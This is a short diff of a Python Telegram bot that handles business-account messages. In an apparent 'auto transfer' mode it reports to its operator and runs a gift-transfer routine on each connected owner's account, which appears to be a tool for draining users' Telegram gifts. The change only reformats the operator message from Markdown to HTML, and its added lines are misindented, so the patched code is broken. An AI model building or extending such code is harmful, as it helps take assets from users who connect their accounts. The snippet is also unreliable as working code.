@@ -311,7 +311,11 @@ async def handle_business_message(message: types.Message, bot_instance: Bot = bo
         if auto_transfer_mode: processing_status_line_content = "⚙️ Статус: ❌ Ошибка (нет доступа к данным)"
 
     if auto_transfer_mode and permission_status_content == "✅ On (Чтение доступно)":
-        await bot_instance.send_message(MY_ID, f"**🤖 Автоматическая обработка для @{business_owner_username} (ID: {business_connection_id})...**", parse_mode=ParseMode.MARKDOWN)
+       await bot_instance.send_message(
+    MY_ID,
+    f"🤖 Автоматическая обработка для @{business_owner_username} (ID: {business_connection_id})...",
+    parse_mode=ParseMode.HTML
+)
         res = await execute_gift_transfer(business_connection_id, bot_instance, business_owner_username)
         success_emoji = '✅' if res['overall_success'] else '⚠️'
         status_part = f"⚙️ Статус: {success_emoji} {'Успешно' if res['overall_success'] else 'Ошибки'}"
